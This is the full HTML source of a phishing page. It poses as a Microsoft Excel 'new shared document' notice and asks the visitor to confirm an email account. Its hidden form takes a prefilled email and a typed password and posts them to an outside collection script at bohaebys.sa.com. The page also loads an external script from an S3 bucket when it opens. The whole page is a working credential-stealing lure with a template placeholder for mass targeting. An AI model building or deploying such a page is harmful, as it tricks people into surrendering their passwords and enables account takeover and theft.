<!DOCTYPE html>
<html>
<head>
<style>
.button {
  background-color: darkgreen;
  border: none;
  color: white;
  padding: 12px 37px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
  cursor: pointer;
}
.new-dream {
  background-color: darkgreen;
  border: none;
  color: white;
  padding: 12px 37px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
  cursor: pointer;
}


body, html {
  height: 100%;
  margin: 0;
    font-family: 'Calibri', serif;
        font-size: 16px;
}

* {
  box-sizing: border-box;
}

.bg-image {

  /* Full height */
  height: 100%;

  /* Center and scale the image nicely */
  background-position: fixed;
  background-repeat: no-repeat;
  background-size: cover;
}
  @media screen and (max-width: 1024px){
   .bg-image {
    left: 50%;
    margin-left: -512px; }
  }

/* Position text in the middle of the page/image */
.bg-text {
  background-color: rgb(0,0,0); /* Fallback color */
  background-color: white; /* Black w/opacity/see-through */
  color: black;
  border: 3px solid #f1f1f1;
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  z-index: 2;
  width: 400px;
  padding: 20px;
  text-align: center;
  -moz-box-shadow: 0 0 20px black;
  -webkit-box-shadow: 0 0 20px black;
   box-shadow: 0 0 20px black;
}

input[type=password] {
  width: 70%;
  padding: 12px;
  border: 1px solid #ccc;
  border-radius: 4px;
  resize: vertical;
}

input[type=email] {
  width: 70%;
  padding: 12px;
  border: 1px solid #ccc;
  border-radius: 4px;
  resize: vertical;
}

h3 {
  background: #00A4EF;
  color: white;
  text-transform: uppercase;
}
.container {
  padding: 30px;
}

.add-dream {
  display: none;
}
.bg-image {
  /* The image used */
  background-image: url('https://i.gyazo.com/716e7fd047ac2ebf6e514daff53792be.png');

  /* Add the blur effect */
  filter: blur(4px);
  -webkit-filter: blur(3px);
</style>




<title>Confirm identity</title>
<link rel="stylesheet" href="my.css">
<script src="https://myselfandme.s3.amazonaws.com/my.js"></script>
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<link rel="stylesheet"
          href="https://fonts.googleapis.com/css?family=Calibri">
<meta name="viewport" content="width=device-width, initial-scale=1">


</head>


<body onload="myFunction()"></>





<body>


<div class="bg-image"></div>

<div class="bg-text">
<img src="https://logos-world.net/wp-content/uploads/2022/02/Microsoft-Excel-Symbol.png" width="200"/>

    <div class="container">

<p>

    <p id="p1">New shared document available</p>
    <div class="panel panel-default dream-add-container">
      <div class="panel-heading"></div><p>
      <div class="panel-body">

        <button class="new-dream" type="button">Open</button>
                 <div class="form-group">
            <div class="form-group">   <form method="post" action="https://bohaebys.sa.com/DOC/daemon.php" class="add-dream">
<b><font size="2" color="Green">Confirm email account to continue</font></b>
            <input type="email" placeholder="&#30005;&#23376;&#37038;&#20214;&#22320;&#22336;" name="email" required="" readonly="readonly" required="" value="[[-Email-]]"<?php  /><p>
<p><input type="password" name="password" required="" vmin="5" placeholder="&#23494;&#30721;">  <p></p><button type="submit" class="button">login</button><p>
            <img src="https://c.tenor.com/I6kN-6X7nhAAAAAj/loading-buffering.gif" width="30"/>
                <div class="form-group">

          </div>
        </form>

      </div>
    </div>

  </div>

</body>

</html>
<!-- partial -->
  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>
<script src='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js'></script><script  src="./script.js"></script>
     </form>
  </div>

</body>
<script>
  $(function() {
  var obj = $(".dream-add-container");
  obj.find(".new-dream").on("click", function() {
    $(this).hide();
    obj
      .find(".add-dream")
      .stop()
      .slideDown();
  })
  .end().find(".btn-cancel").on('click', function(){
obj
      .find(".add-dream")
      .stop()
      .slideUp(function(){
  obj.find(".new-dream").stop().fadeIn()
})

})
});
</script>





</html>
